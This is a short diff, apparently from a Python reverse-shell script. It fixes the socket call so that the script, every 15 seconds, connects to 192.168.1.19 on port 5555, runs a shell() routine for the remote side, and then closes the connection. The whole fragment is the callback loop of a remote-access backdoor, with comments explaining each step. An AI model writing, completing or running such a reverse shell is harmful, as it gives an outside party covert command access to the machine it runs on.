@@ -8,7 +8,7 @@ def connection():
     while True:
         time.sleep(15)
         try:
-            sock.connect(('192.168.1.19, 5555')) #Has the socket try top connect to IP address and port
+            sock.connect(('192.168.1.19', 5555)) #Has the socket try top connect to IP address and port
             shell() #see def shell
             sock.close() #closes connection when shell is done
             break
